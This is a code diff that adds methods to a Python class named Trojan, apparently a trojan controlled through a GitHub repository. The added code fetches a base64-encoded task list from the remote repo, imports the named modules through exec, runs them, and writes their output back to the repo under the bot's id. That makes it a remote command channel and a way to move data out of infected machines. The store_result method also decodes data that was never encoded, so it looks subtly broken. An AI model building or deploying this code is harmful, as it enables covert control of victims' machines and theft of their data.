@@ -28,5 +28,21 @@ class Trojan:
     def get_config(self):
         config_file = get_content('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_file))
-        
-            
+
+        for task in config:
+            if task['module'] not in sys.modules:
+                exec("import %s" % task['module'])
+        return config
+
+    def store_result(self, data):
+        message = datetime.now().isoformat()
+        remotepath = f'data/{self.id}/{message}.data'
+        bindata = bytes('%r' % data, 'utf-8')
+        self.repo.create_file(remotepath, message, base64.b64decode(bindata))
+
+    def module_runner(self, module):
+        result = sys.modules[module].run()
+        self.store_result(result)
+
+
+
